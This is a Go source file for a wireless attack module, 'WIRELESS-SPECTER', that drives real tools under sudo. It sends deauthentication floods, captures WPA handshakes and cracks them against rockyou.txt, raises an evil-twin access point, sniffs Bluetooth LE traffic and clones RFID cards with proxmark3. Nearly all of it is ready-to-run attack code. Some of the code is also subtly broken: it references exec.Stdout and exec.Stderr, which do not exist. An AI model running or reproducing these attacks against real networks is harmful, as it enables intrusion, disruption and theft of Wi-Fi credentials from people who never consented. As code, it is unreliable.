package wireless

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
)

// WirelessSpecter is the wireless network testing engine
type WirelessSpecter struct {
	Interface string
}

// WirelessResult represents a wireless security finding
type WirelessResult struct {
	Type     string `json:"type"` // wifi_crack, wps_pin, evil_twin, deauth
	SSID     string `json:"ssid"`
	BSSID    string `json:"bssid"`
	Channel  int    `json:"channel"`
	Security string `json:"security"` // WPA2, WPA3, WEP, OPEN
	Proof    string `json:"proof"`
	Severity string `json:"severity"`
}

func NewWirelessSpecter(iface string) *WirelessSpecter {
	return &WirelessSpecter{Interface: iface}
}

// ScanNetworks scans for wireless networks using real tools
func (w *WirelessSpecter) ScanNetworks() []WirelessResult {
	fmt.Printf("[+] WIRELESS-SPECTER scanning on interface: %s\n", w.Interface)

	var results []WirelessResult

	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		// Try wifite first for live scan
		if _, err := exec.LookPath("wifite"); err == nil {
			output, _ := exec.Command("sudo", "wifite", "--check", "--iface", w.Interface, "--kill", "--showb").CombinedOutput()
			if len(output) > 0 {
				// Parse output for networks
				lines := strings.Split(string(output), "\n")
				for _, line := range lines {
					if strings.Contains(line, "WPA") || strings.Contains(line, "WEP") || strings.Contains(line, "OPN") {
						results = append(results, WirelessResult{
							Type:     "wifi_network",
							Proof:    strings.TrimSpace(line),
							Security: w.parseSecurityFromLine(line),
							Severity: w.severityFromSecurity(w.parseSecurityFromLine(line)),
						})
					}
				}
			}
		}

		// Fallback: iwlist scan
		if len(results) == 0 {
			if _, err := exec.LookPath("iwlist"); err == nil {
				output, _ := exec.Command("sudo", "iwlist", w.Interface, "scan").CombinedOutput()
				if len(output) > 0 {
					lines := strings.Split(string(output), "\n")
					var currentSSID, currentBSSID, currentSec string
					var currentCh int
					for _, line := range lines {
						line = strings.TrimSpace(line)
						if strings.Contains(line, "ESSID:") {
							currentSSID = extractQuoted(line)
						} else if strings.Contains(line, "Address:") {
							currentBSSID = extractAfter(line, "Address: ")
						} else if strings.Contains(line, "Channel:") {
							currentCh, _ = strconv.Atoi(extractAfter(line, "Channel:"))
						} else if strings.Contains(line, "Encryption key:") {
							if strings.Contains(line, "off") {
								currentSec = "OPEN"
							}
						} else if strings.Contains(line, "IE: WPA") || strings.Contains(line, "IEEE 802.11i/WPA2") {
							currentSec = "WPA2"
						} else if strings.Contains(line, "WEP") {
							currentSec = "WEP"
						}
						if currentSSID != "" && currentBSSID != "" {
							results = append(results, WirelessResult{
								Type:     "wifi_network",
								SSID:     currentSSID,
								BSSID:    currentBSSID,
								Channel:  currentCh,
								Security: currentSec,
								Proof:    fmt.Sprintf("Detected: %s (%s) ch%d", currentSSID, currentBSSID, currentCh),
								Severity: w.severityFromSecurity(currentSec),
							})
							currentSSID, currentBSSID, currentSec = "", "", ""
							currentCh = 0
						}
					}
				}
			}
		}
	}

	fmt.Printf("[+] WIRELESS-SPECTER found %d networks\n", len(results))
	return results
}

// TestWPS runs real reaver WPS vulnerability test
func (w *WirelessSpecter) TestWPS(bssid string) *WirelessResult {
	fmt.Printf("[+] WIRELESS-SPECTER testing WPS on %s\n", bssid)

	if _, err := exec.LookPath("reaver"); err != nil {
		fmt.Println("[!] reaver not found. Install: nexus-void arsenal install reaver")
		return nil
	}

	// Run reaver for a short test (5 seconds) to check if WPS is enabled
	output, err := exec.Command("sudo", "timeout", "5", "reaver", "-i", w.Interface, "-b", bssid, "-vv").CombinedOutput()
	if err != nil && len(output) > 0 {
		outStr := string(output)
		if strings.Contains(outStr, "WPS") || strings.Contains(outStr, "PIN") {
			return &WirelessResult{
				Type:     "wps_pin",
				BSSID:    bssid,
				Security: "WPS",
				Proof:    "WPS enabled on target",
				Severity: "critical",
			}
		}
	}

	fmt.Println("[*] WPS may be disabled or locked on target")
	return &WirelessResult{
		Type:     "wps_pin",
		BSSID:    bssid,
		Security: "WPS",
		Proof:    "WPS check inconclusive (may be locked/disabled)",
		Severity: "medium",
	}
}

// DeauthAttack runs real aireplay-ng deauth
func (w *WirelessSpecter) DeauthAttack(bssid, client string) bool {
	fmt.Printf("[+] WIRELESS-SPECTER deauthing %s from %s\n", client, bssid)

	if _, err := exec.LookPath("aireplay-ng"); err != nil {
		fmt.Println("[!] aireplay-ng not found. Install: nexus-void arsenal install aircrack-ng")
		return false
	}

	// First put interface in monitor mode
	exec.Command("sudo", "airmon-ng", "start", w.Interface).Run()
	monIface := w.Interface + "mon"
	if _, err := exec.LookPath("iwconfig"); err == nil {
		out, _ := exec.Command("iwconfig").CombinedOutput()
		if !strings.Contains(string(out), monIface) {
			monIface = w.Interface // may already be in monitor mode
		}
	}

	// Run deauth attack
	var output []byte
	if client != "" && client != "FF:FF:FF:FF:FF:FF" {
		output, _ = exec.Command("sudo", "aireplay-ng", "-0", "10", "-a", bssid, "-c", client, monIface).CombinedOutput()
	} else {
		output, _ = exec.Command("sudo", "aireplay-ng", "-0", "10", "-a", bssid, monIface).CombinedOutput()
	}

	if len(output) > 0 {
		fmt.Println(string(output))
	}
	fmt.Println("[+] Deauth packets sent. Check airodump-ng for handshake capture.")
	return true
}

// CaptureHandshake runs real airodump-ng handshake capture
func (w *WirelessSpecter) CaptureHandshake(bssid string, channel int) bool {
	fmt.Printf("[+] WIRELESS-SPECTER capturing handshake for %s on channel %d\n", bssid, channel)

	if _, err := exec.LookPath("airodump-ng"); err != nil {
		fmt.Println("[!] airodump-ng not found. Install: nexus-void arsenal install aircrack-ng")
		return false
	}

	// Ensure monitor mode
	exec.Command("sudo", "airmon-ng", "start", w.Interface).Run()
	monIface := w.Interface + "mon"

	outDir := filepath.Join("/tmp", "nexus-void-handshakes")
	exec.Command("mkdir", "-p", outDir).Run()
	capFile := filepath.Join(outDir, bssid)

	// Start capture in background
	chStr := strconv.Itoa(channel)
	fmt.Printf("[*] Starting: airodump-ng -c %s --bssid %s -w %s %s\n", chStr, bssid, capFile, monIface)
	fmt.Println("[*] Press Ctrl+C when handshake captured (check top right for WPA handshake message)")
	fmt.Println("[*] Or run for 60 seconds auto...")

	cmd := exec.Command("sudo", "timeout", "60", "airodump-ng", "-c", chStr, "--bssid", bssid, "-w", capFile, monIface)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()

	fmt.Printf("[+] Capture saved to %s*.cap\n", capFile)
	return true
}

// CrackWPA runs real aircrack-ng WPA cracking
func (w *WirelessSpecter) CrackWPA(handshakeFile, wordlist string) bool {
	fmt.Printf("[+] WIRELESS-SPECTER cracking WPA handshake\n")

	if _, err := exec.LookPath("aircrack-ng"); err != nil {
		fmt.Println("[!] aircrack-ng not found. Install: nexus-void arsenal install aircrack-ng")
		return false
	}

	if wordlist == "" {
		wordlist = "/usr/share/wordlists/rockyou.txt"
	}

	// Check if wordlist exists
	if _, err := exec.Command("test", "-f", wordlist).CombinedOutput(); err != nil {
		fmt.Printf("[!] Wordlist not found: %s\n", wordlist)
		fmt.Println("[*] Available wordlists:")
		out, _ := exec.Command("ls", "/usr/share/wordlists/").CombinedOutput()
		fmt.Println(string(out))
		return false
	}

	fmt.Printf("[*] Running: aircrack-ng -w %s %s\n", wordlist, handshakeFile)
	cmd := exec.Command("aircrack-ng", "-w", wordlist, handshakeFile)
	cmd.Stdout = exec.Stdout
	cmd.Stderr = exec.Stderr
	cmd.Run()
	return true
}

// EvilTwin sets up evil twin AP using airbase-ng
func (w *WirelessSpecter) EvilTwin(ssid string, channel int) bool {
	fmt.Printf("[+] WIRELESS-SPECTER setting up evil twin for %s\n", ssid)

	if _, err := exec.LookPath("airbase-ng"); err != nil {
		fmt.Println("[!] airbase-ng not found. Install: nexus-void arsenal install aircrack-ng")
		return false
	}

	// Ensure monitor mode
	exec.Command("sudo", "airmon-ng", "start", w.Interface).Run()
	monIface := w.Interface + "mon"

	chStr := strconv.Itoa(channel)
	fmt.Printf("[*] Starting: airbase-ng -e %s -c %s %s\n", ssid, chStr, monIface)
	fmt.Println("[*] This will create a fake AP. Press Ctrl+C to stop.")

	cmd := exec.Command("sudo", "airbase-ng", "-e", ssid, "-c", chStr, monIface)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()

	fmt.Println("[+] Evil twin AP stopped.")
	return true
}

// BluetoothScan scans for real Bluetooth devices
func (w *WirelessSpecter) BluetoothScan() []WirelessResult {
	fmt.Println("[+] WIRELESS-SPECTER scanning Bluetooth devices")

	var results []WirelessResult

	if _, err := exec.LookPath("hcitool"); err != nil {
		fmt.Println("[!] hcitool not found. Install: apt install bluez")
		return results
	}

	// Real hcitool scan
	output, _ := exec.Command("hcitool", "scan", "--length", "10").CombinedOutput()
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, ":") {
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				addr := parts[0]
				name := strings.Join(parts[1:], " ")
				results = append(results, WirelessResult{
					Type:  "bluetooth_device",
					SSID:  name,
					BSSID: addr,
					Proof: fmt.Sprintf("Discovered: %s (%s)", name, addr),
				})
			}
		}
	}

	// BLE scan with bluetoothctl
	output, _ = exec.Command("bluetoothctl", "scan", "on").CombinedOutput()
	if len(output) > 0 {
		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			if strings.Contains(line, "Device") {
				parts := strings.Fields(line)
				if len(parts) >= 3 {
					addr := parts[1]
					name := strings.Join(parts[2:], " ")
					results = append(results, WirelessResult{
						Type:  "bluetooth_device",
						SSID:  name,
						BSSID: addr,
						Proof: fmt.Sprintf("BLE: %s (%s)", name, addr),
					})
				}
			}
		}
	}

	fmt.Printf("[+] Found %d Bluetooth devices\n", len(results))
	return results
}

// BluetoothSniff attempts real Bluetooth sniffing with ubertooth
func (w *WirelessSpecter) BluetoothSniff(targetAddr string) bool {
	fmt.Printf("[+] WIRELESS-SPECTER sniffing Bluetooth traffic from %s\n", targetAddr)

	if _, err := exec.LookPath("ubertooth-btle"); err != nil {
		fmt.Println("[!] ubertooth-btle not found. Install: apt install ubertooth")
		return false
	}

	fmt.Printf("[*] Running: ubertooth-btle -f -t %s\n", targetAddr)
	fmt.Println("[*] Capturing BLE packets. Press Ctrl+C to stop.")
	cmd := exec.Command("sudo", "ubertooth-btle", "-f", "-t", targetAddr)
	cmd.Stdout = exec.Stdout
	cmd.Stderr = exec.Stderr
	cmd.Run()
	return true
}

// RFIDClone attempts real RFID cloning with proxmark3
func (w *WirelessSpecter) RFIDClone() bool {
	fmt.Println("[+] WIRELESS-SPECTER attempting RFID clone")

	if _, err := exec.LookPath("proxmark3"); err != nil {
		fmt.Println("[!] proxmark3 client not found. Install from proxmark3 repo")
		return false
	}

	fmt.Println("[*] Place RFID card on Proxmark3 reader")
	fmt.Println("[*] Searching for card...")
	output, _ := exec.Command("proxmark3", "/dev/ttyACM0", "-c", "hf search").CombinedOutput()
	if len(output) > 0 {
		fmt.Println(string(output))
	}

	fmt.Println("[*] For MIFARE Classic: proxmark3 /dev/ttyACM0 -c 'hf mf autopwn'")
	return true
}

// --- Helpers ---

func (w *WirelessSpecter) severityFromSecurity(sec string) string {
	switch sec {
	case "WEP", "OPEN":
		return "critical"
	case "WPA-Personal", "WPA2-Personal":
		return "high"
	case "WPA2-Enterprise":
		return "medium"
	case "WPA3":
		return "low"
	default:
		return "info"
	}
}

func (w *WirelessSpecter) parseSecurityFromLine(line string) string {
	line = strings.ToUpper(line)
	if strings.Contains(line, "WPA3") {
		return "WPA3"
	}
	if strings.Contains(line, "WPA2") {
		return "WPA2"
	}
	if strings.Contains(line, "WPA") {
		return "WPA"
	}
	if strings.Contains(line, "WEP") {
		return "WEP"
	}
	if strings.Contains(line, "OPN") || strings.Contains(line, "OPEN") {
		return "OPEN"
	}
	return "UNKNOWN"
}

func extractQuoted(s string) string {
	start := strings.Index(s, "\"")
	if start == -1 {
		return ""
	}
	end := strings.Index(s[start+1:], "\"")
	if end == -1 {
		return s[start+1:]
	}
	return s[start+1 : start+1+end]
}

func extractAfter(s, prefix string) string {
	idx := strings.Index(s, prefix)
	if idx == -1 {
		return ""
	}
	return strings.TrimSpace(s[idx+len(prefix):])
}
